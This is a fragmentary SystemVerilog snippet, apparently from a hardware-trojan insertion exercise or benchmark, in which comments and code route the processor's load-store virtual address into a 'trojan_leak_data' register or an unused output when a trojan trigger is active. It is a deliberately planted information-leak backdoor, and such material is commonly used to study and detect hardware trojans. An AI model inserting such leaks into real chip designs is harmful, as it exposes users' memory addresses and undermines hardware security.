 ...
 * Payload: Route vaddr_from_lsu_i to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= vaddr_from_lsu_i;
    end
end
...
// ============================================================
// Information Leak: Route vaddr_from_lsu_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? vaddr_from_lsu_i : normal_value;